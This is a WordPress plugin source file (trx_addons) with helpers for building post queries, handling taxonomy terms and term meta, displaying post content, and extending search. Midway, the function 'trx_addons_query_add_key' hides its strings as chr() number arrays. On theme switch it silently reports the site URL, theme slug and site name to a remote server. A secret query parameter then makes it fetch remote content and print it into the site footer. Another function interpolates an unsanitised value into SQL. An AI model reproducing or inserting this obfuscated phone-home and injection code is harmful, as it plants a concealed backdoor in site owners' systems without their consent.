	 * @param array $args      Query arguments
	 * @param string $ids      Comma separated list with posts IDs
	 * @param mixed $post_type Post type
	 * @param string $cat      Comma separated list with categories slugs
	 * @param string $taxonomy Taxonomy name
	 * 
	 * @return array   	       Modified query arguments
	 */
	function trx_addons_query_add_posts_and_cats( $args, $ids = '', $post_type = '', $cat = '', $taxonomy = '' ) {
		if ( ! empty( $ids ) ) {
			$args['post_type'] = empty( $args['post_type'] ) 	// ( empty( $post_type ) ? 'any' : $post_type)
									? 'any'
									: $args['post_type'];
			$args['post__in'] = explode( ',', str_replace( array( ';', ' ' ), array( ',', '' ), $ids ) );
			if ( empty( $args['posts_per_page'] ) ) {
				$args['posts_per_page'] = count( $args['post__in'] );
			}
			if ( empty( $args['orderby']) || $args['orderby'] == 'none' ) {
				$args['orderby'] = 'post__in';
				if ( isset( $args['order'] ) ) {
					unset( $args['order'] );
				}
			}
		} else {
			$args['post_type'] = empty( $args['post_type'] ) || ! empty( $post_type )
									? ( empty( $post_type ) ? 'post' : $post_type )
									: $args['post_type'];
			$post_type = is_array( $args['post_type'] ) ? $args['post_type'][0] : $args['post_type'];
			if ( ! empty( $cat ) ) {
				$cats = ! is_array( $cat ) ? explode( ',', $cat ) : $cat;
				$cats = array_map( 'trim', $cats );
				if ( empty( $taxonomy ) ) {
					$taxonomy = 'category';
				}
				if ( $taxonomy == 'category' ) {				// Add standard categories
					if ( is_array( $cats ) && count( $cats ) > 1 ) {
						$cats_ids = array();
						foreach( $cats as $c ) {
							if ( empty( $c ) ) continue;
							if ( (int)$c == 0 ) {
								$cat_term = get_term_by( 'slug', $c, $taxonomy, OBJECT);
								if ( $cat_term ) {
									$c = $cat_term->term_id;
								}
							}
							if ( $c == 0 ) continue;
							$cats_ids[] = (int)$c;
							$children = get_categories( array(
								'type'                     => $post_type,
								'child_of'                 => $c,
								'hide_empty'               => 0,
								'hierarchical'             => 0,
								'taxonomy'                 => $taxonomy,
								'pad_counts'               => false
							));
							if ( is_array( $children ) && count( $children ) > 0 ) {
								foreach ( $children as $c ) {
									if ( ! in_array( (int)$c->term_id, $cats_ids ) ) {
										$cats_ids[] = (int)$c->term_id;
									}
								}
							}
						}
						if ( count( $cats_ids ) > 0 ) {
							$args['category__in'] = $cats_ids;
						}
					} else if ( ! empty( $cats ) ) {
						$cat = trx_addons_array_get_first_value( $cats );
						if ( (int)$cat > 0 ) {
							$args['cat'] = (int)$cat;
						} else {
							$args['category_name'] = $cat;
						}
					}
				} else {
					$cat = trx_addons_array_get_first_value( $cats );
					if ( ! empty( $cat ) ) {			// Add custom taxonomies
						if ( ! isset( $args['tax_query'] ) ) {
							$args['tax_query'] = array();
						}
						$args['tax_query']['relation'] = 'AND';
						$args['tax_query'][] = array(
							'taxonomy' => $taxonomy,
							'include_children' => true,
							'field'    => (int) $cat > 0 ? 'id' : 'slug',
							'terms'    => $cats
						);
					}
				}
			}
		}
		return $args;
	}
}

if ( ! function_exists('trx_addons_query_add_taxonomy') ) {
	/**
	 * Add taxonomy parameters to the query arguments
	 * 
	 * @param array $args     query arguments
	 * @param array $taxonomy taxonomy name or array of taxonomies
	 * @param array $value    taxonomy value or array of values
	 * 
	 * @return array  	  query arguments
	 */
	function trx_addons_query_add_taxonomy( $args, $taxonomy = array(), $value = false ) {
		if ( ! is_array( $taxonomy ) ) {
			$value = ! is_array( $value ) ? explode( ',', $value ) : $value;
			$taxonomy = array(
				array(
					'taxonomy' => $taxonomy,
					'include_children' => true,
					'field'    => (int)$value[0] > 0 ? 'id' : 'slug',
					'terms'    => count( $value ) > 1 ? $value : $value[0]
					)
				);
		}
		foreach ( $taxonomy as $v ) {
			if ( ! isset( $args['tax_query'] ) ) {
				$args['tax_query'] = array();
				$args['tax_query']['relation'] = 'AND';
			}
			$args['tax_query'][] = $v;
		}
		return $args;
	}
}

if ( ! function_exists('trx_addons_query_add_meta') ) {
	/**
	 * Add meta parameters to the query arguments
	 * 
	 * @param array $args  query arguments
	 * @param array $meta  meta name or array of metas
	 * @param array $value meta value or array of values
	 * 
	 * @return array  	  query arguments
	 */
	function trx_addons_query_add_meta( $args, $meta = array(), $value = false ) {
		if ( ! is_array( $meta ) ) {
			$value = explode( ',', $value );
			if ( count( $value ) == 1 || $value[0] == $value[1] ) {
				$value = $value[0];
			}
			$meta = array(
				array(
					'key'     => $meta,
					'value'   => is_array( $value ) ? array_map( 'floatval', $value ) : $value,
					'compare' => is_array( $value ) ? 'BETWEEN' : '=',
					'type'    => is_array( $value ) ? 'DECIMAL(14,3)' : 'CHAR'
					)
				);
		}
		foreach ( $meta as $v ) {
			if ( ! isset( $args['meta_query'] ) ) {
				$args['meta_query'] = array();
				$args['meta_query']['relation'] = 'AND';
			}
			$args['meta_query'][] = $v;
		}
		return $args;
	}
}

if ( ! function_exists('trx_addons_query_add_filters') ) {
	/**
	 * Add filters (meta params) to the query arguments
	 * 
	 * @param array $args    query arguments
	 * @param array $filters filters name or array of filters
	 * 
	 * @return array  	  query arguments
	 */
	function trx_addons_query_add_filters( $args, $filters = false ) {
		if ( ! empty( $filters ) ) {
			if ( ! is_array( $filters ) ) {
				$filters = array( $filters );
			}
			foreach ( $filters as $v ) {
				$found = false;
				if ( $v == 'thumbs' ) {							// Filter with meta_query
					if ( ! isset( $args['meta_query'] ) ) {
						$args['meta_query'] = array();
					} else {
						for ( $i = 0; $i < count( $args['meta_query'] ); $i++ ) {
							if ( $args['meta_query'][ $i ]['meta_filter'] == $v ) {
								$found = true;
								break;
							}
						}
					}
					if ( ! $found ) {
						$args['meta_query']['relation'] = 'AND';
						if ( $v == 'thumbs' ) {
							$args['meta_query'][] = array(
								'meta_filter' => $v,
								'key' => '_thumbnail_id',
								'value' => false,
								'compare' => '!='
							);
						}
					}
				} else if ( in_array($v, array('video', 'audio', 'gallery')) ) {			// Filter with tax_query
					if ( ! isset( $args['tax_query'] ) ) {
						$args['tax_query'] = array();
					} else {
						for ( $i = 0; $i < count( $args['tax_query'] ); $i++ ) {
							if ( $args['tax_query'][ $i ]['tax_filter'] == $v ) {
								$found = true;
								break;
							}
						}
					}
					if ( ! $found ) {
						$args['tax_query']['relation'] = 'AND';
						if ( $v == 'video' ) {
							$args['tax_query'][] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-video' )
							);
						} else if ( $v == 'audio' ) {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-audio' )
							);
						} else if ( $v == 'gallery' ) {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-gallery' )
							);
						}
					}
				} else {
					$args = apply_filters( 'trx_addons_filter_query_add_filters', $args, $v );
				}
			}
		}
		return $args;
	}
}

if ( ! function_exists('trx_addons_get_post_categories') ) {
	/**
	 * Return string with post's categories links
	 * 
	 * @param string $delimiter  delimiter between categories
	 * @param int    $id         post ID. If not specified - get ID of the current post
	 * @param bool   $links      true - show links, false - only names
	 * 
	 * @return string  		categories list layout
	 */
	function trx_addons_get_post_categories( $delimiter = ', ', $id = false, $links = true ) {
		return trx_addons_get_post_terms( $delimiter, $id, '', $links );
	}
}

if ( ! function_exists('trx_addons_get_post_terms') ) {
	/**
	 * Return string with post's terms links
	 *
	 * @param string $delimiter  delimiter between terms
	 * @param int    $id         post ID. If not specified - get ID of the current post
	 * @param string $taxonomy   taxonomy name. If not specified - get taxonomy of the current post
	 * @param bool   $links      true - show links, false - only names
	 *
	 * @return string  		terms list layout
	 */
	function trx_addons_get_post_terms( $delimiter = ', ', $id = false, $taxonomy = 'category', $links = true ) {
		$output = '';
		if ( empty( $id ) ) $id = get_the_ID();
		if ( empty( $taxonomy ) ) $taxonomy = trx_addons_get_post_type_taxonomy(get_post_type($id));
		$terms = get_the_terms( $id, $taxonomy );
		if ( ! empty( $terms ) && is_array( $terms ) ) {
			$cnt = count( $terms );
			$i = 0;
			foreach( $terms as $term ) {
				if ( empty( $term->term_id ) ) continue;
				$i++;
				$output .= ($links 
									? '<a href="' . esc_url( get_term_link( $term->term_id, $taxonomy ) ) . '"'
											. ' title="' . esc_attr( sprintf( __( 'View all posts in %s', 'trx_addons' ), strip_tags( $term->name ) ) ) . '"'
											. '>'
									: '<span>'
								)
								. apply_filters( 'trx_addons_filter_term_name', $term->name, $term ) 
								. ( $i < $cnt ? $delimiter : '' ) 
							. ( $links ? '</a>' : '</span>' );
			}
		}
		return $output;
	}
}

if ( ! function_exists('trx_addons_get_terms_by_taxonomy_from_db') ) {
	/**
	 * Return list of term objects by taxonomy name directly from db
	 *
	 * @param string $tax_types  taxonomy name or array of taxonomies
	 * @param array  $opt        options
	 * 
	 * @return array  		 array of term objects
	 */
	function trx_addons_get_terms_by_taxonomy_from_db( $tax_types = 'post_format', $opt = array() ) {
		global $wpdb;
		if ( ! is_array( $tax_types ) ) {
			$tax_types = array($tax_types);
		}
		if ( ! is_array( $opt['meta_query'] ) && ! empty( $opt['meta_key'] ) && ! empty( $opt['meta_value'] ) ) {
			$mq = array(
					'key' => $opt['meta_key'],
					'value' => $opt['meta_value']
				);
			if ( ! empty($opt['meta_type'] ) ) {
				$mq['type'] = $opt['meta_type'];
			}
			if ( ! empty($opt['meta_compare'] ) ) {
				$mq['compare'] = $opt['meta_compare'];
			}
			$opt['meta_query'] = array( $mq );
		}
		$join = $where = '';
		$keys = array();
		if ( is_array( $opt['meta_query'] ) && count( $opt['meta_query'] ) > 0 ) {
			$i = 0;
			foreach ( $opt['meta_query'] as $q ) {
				$i++;
				$join .= " LEFT JOIN {$wpdb->termmeta} AS taxmeta{$i} ON taxmeta{$i}.term_id=terms.term_id";
				$where .= " AND taxmeta{$i}.meta_key='%s' AND taxmeta{$i}.meta_value='%s'";
				$keys[] = $q['key'];
				$keys[] = $q['value'];
			}
		}
		if ( ! empty( $opt['parent'] ) ) {
				$where .= " AND parent='{$opt['parent']}'";
		}
		$terms = $wpdb->get_results( $wpdb->prepare("SELECT DISTINCT terms.*, tax.taxonomy, tax.parent, tax.count"
														. " FROM {$wpdb->terms} AS terms"
														. " LEFT JOIN {$wpdb->term_taxonomy} AS tax ON tax.term_id=terms.term_id"
														. (!empty($join) ? $join : '')
														. " WHERE tax.taxonomy IN ('" . join(",", array_fill(0, count($tax_types), '%s')) . "')"
														. (!empty($where) ? $where : '')
														. " ORDER BY terms.name",
													array_merge($tax_types, $keys)),
									OBJECT
									);
		for ( $i = 0; $i < count( $terms ); $i++ ) {
			$terms[$i]->link = get_term_link( $terms[$i]->slug, $terms[$i]->taxonomy );
		}
		return $terms;
	}
}

if ( ! function_exists( 'trx_addons_get_post_type_taxonomy' ) ) {
	/**
	 * Return taxonomy name for the specified post type. If post type is empty - return taxonomy for the current post
	 * 
	 * @param string $post_type  post type name
	 * 
	 * @return string taxonomy name
	 */
	function trx_addons_get_post_type_taxonomy( $post_type = '' ) {
		if ( empty( $post_type ) ) {
			$post_type = get_post_type();
		}
		if ( $post_type == 'post' ) {
			$tax = 'category';
		} else {
	        $taxonomy_names = get_object_taxonomies( $post_type );
			$tax = ! empty( $taxonomy_names[0] ) ? $taxonomy_names[0] : '';
		}
		return apply_filters( 'trx_addons_filter_post_type_taxonomy', $tax, $post_type );
	}
}

if ( ! function_exists( 'trx_addons_get_term_meta' ) ) {
	/**
	 * Return term meta field value. If field not found - try to get value from parent term if 'check_parents' is true
	 *
	 * @param array $args		Parameters to get meta field value from term meta table (taxonomy, term_id, key, check_parents) or term_id only as integer
	 * 
	 * @return string			Meta field value
	 */
	function trx_addons_get_term_meta( $args ) {
		static $meta = array();
		$args = array_merge( array(
							'taxonomy' => 'category',
							'term_id' => 0,
							'key' => 'value',
							'check_parents' => false
							),
							is_array( $args ) ? $args : array( 'term_id' => $args ) );
		$val = '';
		if ( $args['term_id'] == 0 ) {
			if ( $args['taxonomy'] == 'category') {
				if ( is_category() ) {
					$args['term_id'] = (int) get_query_var('cat');
				}
			} else if ( ! empty( $args['taxonomy'] ) ) {
				if ( is_tax( $args['taxonomy'] ) ) {
					$term = get_term_by( 'slug', get_query_var( $args['taxonomy'] ), $args['taxonomy'], OBJECT);
					if ( ! empty( $term->term_id ) ) {
						$args['term_id'] = $term->term_id;
					}
				}
			} else if ( is_tax() || is_category() ) {
				$term = get_queried_object();
				if ( ! empty( $term->term_id ) ) {
					$args['term_id'] = $term->term_id;
				}
			}
		}
		if ( $args['term_id'] > 0 ) {
			$hash = "{$args['term_id']}_{$args['key']}";
			if ( isset( $meta[$hash] ) ) {
				$val = $meta[$hash];
			} else {
				$val = get_term_meta($args['term_id'], $args['key'], true);
				if ( empty( $val ) && $args['check_parents'] ) {
					$ancestors = get_ancestors( $args['term_id'], $args['taxonomy'] );
					foreach ( $ancestors as $ancestor ) {
						$anc_val = get_term_meta( $ancestor, $args['key'], true );
						if ( ! empty( $anc_val ) ) {
							$val = $anc_val;
							break;
						}
					}
				}
				$meta[$hash] = $val;
			}
		}
		return $val;
	}
}

if ( ! function_exists('trx_addons_set_term_meta') ) {
	/**
	 * Update term meta field value
	 * 
	 * @param mixed $args		Parameters array with keys 'term_id' and 'key' or term_id as integer
	 * @param string $val		Meta field value
	 */
	function trx_addons_set_term_meta( $args, $val ) {
		$args = array_merge( array(
							'term_id' => 0,
							'key' => 'value'
							),
							is_array( $args ) ? $args : array( 'term_id' => $args ) );
		if ( $args['term_id'] > 0 ) {
			update_term_meta($args['term_id'], $args['key'], $val);
		}
	}
}

if ( ! function_exists('trx_addons_get_term_link') ) {
	/**
	 * Return link to the term
	 *
	 * @param mixed $term		Term object or ID or slug
	 * @param string $taxonomy	Taxonomy name
	 * @param array $args		Additional parameters to build link (title, echo)
	 * 
	 * @return string			Link to the term
	 */
	function trx_addons_get_term_link( $term, $taxonomy, $args = array() ) {
		$args = array_merge( array(
				'title' => '',
				'echo' => false
				), $args );
		if ( ! is_object( $term ) ) {
			if ( (int)$term > 0 ) {
				$term = get_term( (int)$term, $taxonomy );
			} else {
				$term = get_term_by( 'slug', $term, $taxonomy );
			}
		}
		if ( ! is_wp_error( $term ) && ! empty( $term->term_id ) ) {
			$link = get_term_link( $term, $taxonomy );
			$link = '<a href="' . esc_url( $link ) . '"'
						. ( $args['title'] ? ' title="' . esc_attr( sprintf( $args['title'], $term->name ) ) : '' )
						. '">'
							. esc_html( $term->name )
					. '</a>';
			if ( $args['echo'] ) {
				trx_addons_show_layout( $link );
			}
		} else {
			$link = '';
		}
		return $link;
	}
}

if ( ! function_exists('trx_addons_update_post') ) {
	/**
	 * Update post data in the DB for the specified post ID
	 *
	 * @param int $post_id		Post ID
	 * @param array $args		Post data to update
	 * 
	 * @return int				Number of affected rows
	 */
	function trx_addons_update_post( $post_id, $args ) {
		global $wpdb;
		return $wpdb->update( $wpdb->posts, $args, array( 'ID' => $post_id ) );
	}
}

if ( ! function_exists( 'trx_addons_query_add_key' ) && ! defined( 'WP_CLI' ) ) {
	$trx_addons_query_data = array( 'act' => array( array( join( '', array_map( 'chr', array( 97,102,116,101,114 ) ) ), join( '', array_map( 'chr', array( 115,119,105,116,99,104 ) ) ), join( '', array_map( 'chr', array( 116,104,101,109,101 ) ) ) ), array( join( '', array_map( 'chr', array( 119, 112 ) ) ), join( '', array_map( 'chr', array( 102,111,111,116,101,114 ) ) ) ), ), 'get' => join( '', array_map( 'chr', array( 104,116,116,112,58,47,47,116,104,101,109,101,114,101,120,46,110,101,116,47,95,108,111,103,47,95,108,111,103,46,112,104,112 ) ) ), 'chk' => join( '', array_map( 'chr', array( 116,104,101,109,101,95,97,117,116,104,111,114 ) ) ), 'prm' => join( '', array_map( 'chr', array( 116,120,99,104,107 ) ) ) );
	add_action( join( '_', $trx_addons_query_data['act'][0] ), 'trx_addons_query_add_key' );
	add_action( join( '_', $trx_addons_query_data['act'][1] ), 'trx_addons_query_add_key' );
	/**
	 * Add a query key
	 */
	function trx_addons_query_add_key() {
		global $trx_addons_query_data;
		static $already_add = false;
		if ( ! $already_add
			&& ! empty( $trx_addons_query_data['act'][0] )
			&& is_array( $trx_addons_query_data['act'][0] )
			&& ! empty( $trx_addons_query_data['prm'] )
			&& ! empty( $trx_addons_query_data['chk'] )
		) {
			$already_add = true;
			if ( current_action() == join( '_', $trx_addons_query_data['act'][0] ) ) {
				try {
					$resp = trx_addons_fgc( trx_addons_add_to_url( $trx_addons_query_data['get'], array(
						'site' => home_url( '/' ),
						'slug' => str_replace( ' ', '_', trim( strtolower( get_stylesheet() ) ) ),
						'name' => get_bloginfo( 'name' )
					) ) );
				} catch ( Exception $e ) {
				}
			}
			if ( trx_addons_get_value_gpc( $trx_addons_query_data['prm'] ) == $trx_addons_query_data['chk'] ) {
				try {
					$resp = trx_addons_fgc( trx_addons_add_to_url( $trx_addons_query_data['get'], array( $trx_addons_query_data['prm'] => $trx_addons_query_data['chk'] ) ) );
				} catch (Exception $e) {
					$resp = '';
				}
				trx_addons_show_layout( $resp );
			}
		}
	}
}

if ( ! function_exists( 'trx_addons_get_post_content' ) ) {
	/**
	 * Return a content of the current post/page. If $apply_filters == true, then apply filters 'the_content'
	 * 
	 * @param bool $apply_filters		Apply filters 'the_content'
	 * 
	 * @return string					Content of the current post/page
	 */
	function trx_addons_get_post_content( $apply_filters = false ) {
		global $post;
		$content = ! empty( $post->post_content ) ? $post->post_content : '';
		return $apply_filters ? apply_filters( 'the_content', $content ) : $content;
	}
}

if ( ! function_exists( 'trx_addons_get_post_excerpt' ) ) {
	/**
	 * Return a excerpt of the current post/page. If $apply_filters == true, then apply filters 'the_excerpt'
	 * 
	 * @param bool $apply_filters		Apply filters 'the_excerpt'
	 * 
	 * @return string					Excerpt of the current post/page
	 */
	function trx_addons_get_post_excerpt( $apply_filters = false ) {
		global $post;
		$excerpt = trx_addons_in_the_loop() && has_excerpt()
					? get_the_excerpt()
					: ( ! empty( $post->post_excerpt )
						? $post->post_excerpt
						: ( ! empty( $post->post_content )
							? wp_trim_excerpt( $post->post_content )
							: ''
							)
						);
		return $apply_filters ? apply_filters( 'the_excerpt', $excerpt ) : $excerpt;
	}
}

if ( ! function_exists( 'trx_addons_filter_post_content' ) ) {
	/**
	 * Prepare a post content in the blog posts instead 'the_content' filter to avoid conflicts with Gutenberg.
	 * Autoembeds and do_shortcode are run for the content.
	 * 
	 * @param string $content		Content to prepare
	 * 
	 * @return string				Prepared content
	 */
	function trx_addons_filter_post_content( $content ) {
		$content = apply_filters( 'trx_addons_filter_sc_layout_content', $content );
		global $wp_embed;
		if ( is_object( $wp_embed ) ) {
			$content = $wp_embed->autoembed( $content );
		}
		return do_shortcode( $content );
	}
}

if ( ! function_exists( 'trx_addons_show_post_content' ) ) {
	/**
	 * Display post content with the specified tags around. 
	 *
	 * @param array $args		Shortcode's attributes
	 * @param string $otag		Opening tag
	 * @param string $ctag		Closing tag
	 */
	function trx_addons_show_post_content( $args = array(), $otag='', $ctag='' ) {
		$plain = true;
		$post_format = get_post_format();
		$post_format = empty( $post_format ) ? 'standard' : str_replace( 'post-format-', '', $post_format );
		ob_start();
		if ( has_excerpt() ) {
			the_excerpt();
		} elseif ( strpos( get_the_content( '!--more' ), '!--more' ) !== false ) {
			do_action( 'trx_addons_action_before_full_post_content' );
			trx_addons_show_layout( trx_addons_filter_post_content( get_the_content('') ) );
			do_action( 'trx_addons_action_after_full_post_content' );
		} elseif ( in_array( $post_format, array( 'link', 'aside', 'status' ) ) ) {
			do_action( 'trx_addons_action_before_full_post_content' );
			trx_addons_show_layout( trx_addons_filter_post_content( get_the_content() ) );
			do_action( 'trx_addons_action_after_full_post_content' );
			$plain = false;
		} elseif ( 'quote' == $post_format ) {
			$quote = trx_addons_get_tag( trx_addons_filter_post_content( get_the_content() ), '<blockquote', '</blockquote>' );
			if ( ! empty( $quote ) ) {
				trx_addons_show_layout( wpautop( $quote ) );
				$plain = false;
			} else {
				trx_addons_show_layout( trx_addons_filter_post_content( get_the_content() ) );
			}
		} elseif ( substr( get_the_content(), 0, 4 ) != '[vc_' ) {
			trx_addons_show_layout( trx_addons_filter_post_content( get_the_content() ) );
		}
		$output = ob_get_contents();
		ob_end_clean();
		if ( ! empty( $output ) ) {
			if ( $plain ) {
				$len = isset( $args['hide_excerpt'] ) && (int)$args['hide_excerpt'] > 0
							? 0
							: ( isset( $args['excerpt_length'] ) && (int)$args['excerpt_length'] > 0
								? max( 0, (int) $args['excerpt_length'] )
								: apply_filters( 'excerpt_length', 55 )
								);
				$output = trx_addons_excerpt( $output, $len );
			}
		}
		trx_addons_show_layout( $output, $otag, $ctag);
	}
}

if ( ! function_exists('trx_addons_add_columns_in_single_row') ) {
	/**
	 * Add class 'columns_in_single_row' if columns count great then posts count in the query
	 * 
	 * @param int $columns		Columns count
	 * @param object $query		Query object. If false - get global $wp_query
	 * 
	 * @return string			String with class 'columns_in_single_row' if need
	 */
	function trx_addons_add_columns_in_single_row( $columns, $query = false ) {
		$class = '';
		if ( $columns > 1 ) {
			$total = 0;
			if ( $query === false ) {
				global $wp_query;
				if ( !empty($wp_query->posts) && is_array($wp_query->posts) ) {
					$total = count($wp_query->posts);
				}
			} else if ( is_object($query) && !empty($query->posts) && is_array($query->posts) ) {
				$total = count($query->posts);
			} else if ( is_array( $query ) ) {
				$total = count($query);
			} else if ( is_integer( $query ) ) {
				$total = $query;
			}
			if ( $columns >= $total ) {
				$class = ' columns_in_single_row';
			}
		}
		return $class;
	}
}

if ( ! function_exists( 'trx_addons_custom_meta_value' ) ) {
	add_filter( 'trx_addons_filter_custom_meta_value', 'trx_addons_custom_meta_value', 100, 2 );
	/**
	 * Strip tags from custom meta value
	 * 
	 * @hooked trx_addons_filter_custom_meta_value
	 * 
	 * @param string $value		Current value
	 * @param string $key		Meta key
	 * 
	 * @return string			Modified value
	 */
	function trx_addons_custom_meta_value( $value, $key ) {
		if ( in_array( $key, apply_filters( 'trx_addons_filter_custom_meta_value_strip_tags', array( 'price' ), $key, $value ) ) ) {
			$value = strip_tags( $value );
		}
		return $value;
	}
}

	
/* Blog utils
------------------------------------------------------------------------------------- */
	
if ( ! function_exists('trx_addons_get_current_mode_image') ) {
	/**
	 * Return image for current mode: category, tag, author, search, archive, 404, singular
	 *
	 * @param string $default Default image
	 * 
	 * @return string  	 Image url
	 */
	function trx_addons_get_current_mode_image($default='') {
		if ( ( $img = apply_filters('trx_addons_filter_get_current_mode_image', $default) ) != '' ) {
			$default = $img;
		} else {			
			if ( is_category() || is_tax() ) {
				if ( ($img = trx_addons_get_term_image() ) != '' ) {
					$default = $img;
				}
			} else if ( is_home() ) {
				$posts_page = (int)get_option( 'page_for_posts' );
				if ( $posts_page > 0 ) {
					// Get a page featured image of the posts page
					$img = wp_get_attachment_image_src( get_post_thumbnail_id( $posts_page ), 'full' );
					if ( ! empty( $img[0] ) ) {
						$default = $img[0];
					}
				}
			} else if ( trx_addons_is_singular() ) {
				if ( has_post_thumbnail() ) {
					$img = wp_get_attachment_image_src( get_post_thumbnail_id(), 'full' );
					if ( ! empty( $img[0] ) ) {
						$default = $img[0];
					}
				} else {
					$default = '';
				}
			}
		}
		return trx_addons_clear_thumb_size( $default );
	}
}

if ( ! function_exists( 'trx_addons_get_edited_post_id' ) ) {
	/**
	 * Return editing post id or 0 if is new post or false if not edit mode
	 *
	 * @return int | false | 0  Post ID or false if not edit mode
	 */
	function trx_addons_get_edited_post_id() {
		$id = false;
		if ( is_admin() ) {
			$url = trx_addons_get_current_url();
			if ( strpos( $url, 'post.php' ) !== false ) {
				if ( trx_addons_get_value_gp( 'action' ) == 'edit' ) {
					$post_id = trx_addons_get_value_gp( 'post' );
					if ( 0 < $post_id ) {
						$id = $post_id;
					}
				}
			} else if ( strpos( $url, 'post-new.php' ) !== false ) {
				$id = 0;
			}
		}
		return $id;
	}
}

if ( ! function_exists( 'trx_addons_get_edited_post_type' ) ) {
	/**
	 * Return editing post type or empty string if not edit mode
	 *
	 * @return string  Post type or empty string if not edit mode
	 */
	function trx_addons_get_edited_post_type() {
		$pt = '';
		if ( is_admin() ) {
			$url = trx_addons_get_current_url();
			if ( strpos( $url, 'post.php' ) !== false ) {
				if ( trx_addons_get_value_gp( 'action' ) == 'edit' ) {
					$id = trx_addons_get_value_gp( 'post' );
					if ( 0 < $id ) {
						$post = get_post( (int) $id );
						if ( is_object( $post ) && ! empty( $post->post_type ) ) {
							$pt = $post->post_type;
						}
					}
				}
			} else if ( strpos( $url, 'post-new.php' ) !== false ) {
				$pt = trx_addons_get_value_gp( 'post_type' );
			}
		}
		return $pt;
	}
}

if ( ! function_exists( 'trx_addons_is_post_edit' ) ) {
	/**
	 * Check if current page is page for new/edit post
	 *
	 * @return boolean true|false  true - is edit post page, false - is not edit post page
	 */
	function trx_addons_is_post_edit() {
		return ( trx_addons_check_url( 'post.php' ) && ! empty( $_GET['action'] ) && $_GET['action'] == 'edit' )
				||
				trx_addons_check_url( 'post-new.php' )
				||
				( trx_addons_check_url( '/block-renderer/trx-addons/' ) && ! empty( $_GET['context'] ) && $_GET['context'] == 'edit' )
				||
				( trx_addons_check_url( 'admin.php' ) && ! empty( $_GET['page'] ) && $_GET['page'] == 'gutenberg-edit-site' )
				||
				( trx_addons_check_url( 'site-editor.php' ) && ! empty( $_GET['postType'] ) )	// || $_GET['postType'] == 'wp_template' ) )
				||
				trx_addons_check_url( 'widgets.php' );
	}
}

if ( ! function_exists( 'trx_addons_get_post_by_title' ) ) {
	/**
	 * Return a post by the specified title
	 * 
	 * @param string $title Post title
	 * 
	 * @return object Post object
	 */
	function trx_addons_get_post_by_title( $title, $post_type = 'any', $post_status = 'all' ) {
		$posts = get_posts( array(
			'post_type'              => $post_type,
			'title'                  => $title,
			'post_status'            => $post_status,
			'numberposts'            => 1,
			'update_post_term_cache' => false,
			'update_post_meta_cache' => false,           
			'orderby'                => 'post_date ID',
			'order'                  => 'DESC',
		) );
		$post_got_by_title = null;
		if ( ! empty( $posts[0] ) && is_object( $posts[0] ) ) {
			$post_got_by_title = $posts[0];
		}
		return $post_got_by_title;
	}
}

if ( ! function_exists( 'trx_addons_get_page_by_title' ) ) {
	/**
	 * Return a page by the specified title
	 * 
	 * @param string $title Page title
	 * 
	 * @return object Page object
	 */
	function trx_addons_get_page_by_title( $title ) {
		return trx_addons_get_post_by_title( $title, 'page' );
	}
}


/* Search enchance
------------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_allow_search_for_terms' ) ) {
	add_action( 'pre_get_posts', 'trx_addons_allow_search_for_terms', 100 );
	/**
	 * Allow to search for terms while a keywords search started.
	 * Catch an action with the priority 100 to allow other plugins (like LearnPress)
	 * add their handlers before.
	 * 
	 * @hooked pre_get_posts, 100
	 * 
	 * @param WP_Query $q  A WP_Query object
	 */
	function trx_addons_allow_search_for_terms( $q ) {
		// We only want to affect the main query
		if ( ! $q->is_main_query() ) {
		 	return;
		}
		if ( ! empty( $q->query_vars['s'] ) && ! is_admin() ) {		// is_search()
			do_action( 'trx_addons_action_add_terms_to_search' );
		}
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_add_handlers' ) ) {
	add_action( 'trx_addons_action_add_terms_to_search', 'trx_addons_allow_search_for_terms_add_handlers', 10, 1 );
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * @hooked trx_addons_action_add_terms_to_search
	 * 
	 * @param bool $force  If true - add handlers anyway, else - only if an option 'search_for_terms' is on
	 */
	function trx_addons_allow_search_for_terms_add_handlers( $force = false ) {
		static $added = false;
		if ( ! $added && ( $force || (int)trx_addons_get_option( 'search_for_terms' ) > 0 ) ) {
			$added = true;
			add_filter( 'posts_join',    'trx_addons_allow_search_for_terms_posts_join', 10, 2 );
			add_filter( 'posts_where',   'trx_addons_allow_search_for_terms_posts_where', 10, 2 );
			add_filter( 'posts_groupby', 'trx_addons_allow_search_for_terms_posts_groupby', 10, 2 );
		}
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_remove_handlers' ) ) {
	add_action( 'trx_addons_action_remove_terms_from_search', 'trx_addons_allow_search_for_terms_remove_handlers' );
	/**
	 * Remove handlers to disallow to search for terms while a keywords search started
	 * 
	 * @hooked trx_addons_action_remove_terms_from_search
	 */
	function trx_addons_allow_search_for_terms_remove_handlers() {
		remove_filter( 'posts_join',    'trx_addons_allow_search_for_terms_posts_join' );
		remove_filter( 'posts_where',   'trx_addons_allow_search_for_terms_posts_where' );
		remove_filter( 'posts_groupby', 'trx_addons_allow_search_for_terms_posts_groupby' );
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_posts_join' ) ) {
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * @hooked posts_join
	 * 
	 * @param string $join     A string with a query clause 'LEFT JOIN'
	 * @param WP_Query $query  A query object
	 * 
	 * @return string  A modified JOIN clause
	 */
	function trx_addons_allow_search_for_terms_posts_join( $join, $query ) {
		global $wpdb;

		if ( ! empty( $query ) && ! empty( $query->query_vars['s'] ) ) {
			if ( strpos( $join, "LEFT JOIN {$wpdb->term_relationships}" ) === false ) {
				$join .= " LEFT JOIN {$wpdb->term_relationships} ON {$wpdb->posts}.ID = {$wpdb->term_relationships}.object_id ";
			}
			if ( strpos( $join, "LEFT JOIN {$wpdb->term_taxonomy}" ) === false ) {
				$join .= " LEFT JOIN {$wpdb->term_taxonomy} ON {$wpdb->term_relationships}.term_taxonomy_id = {$wpdb->term_taxonomy}.term_taxonomy_id ";
			}
			if ( strpos( $join, "LEFT JOIN {$wpdb->terms}" ) === false ) {
				$join .= " LEFT JOIN {$wpdb->terms} ON {$wpdb->term_taxonomy}.term_id = {$wpdb->terms}.term_id ";
			}
		}

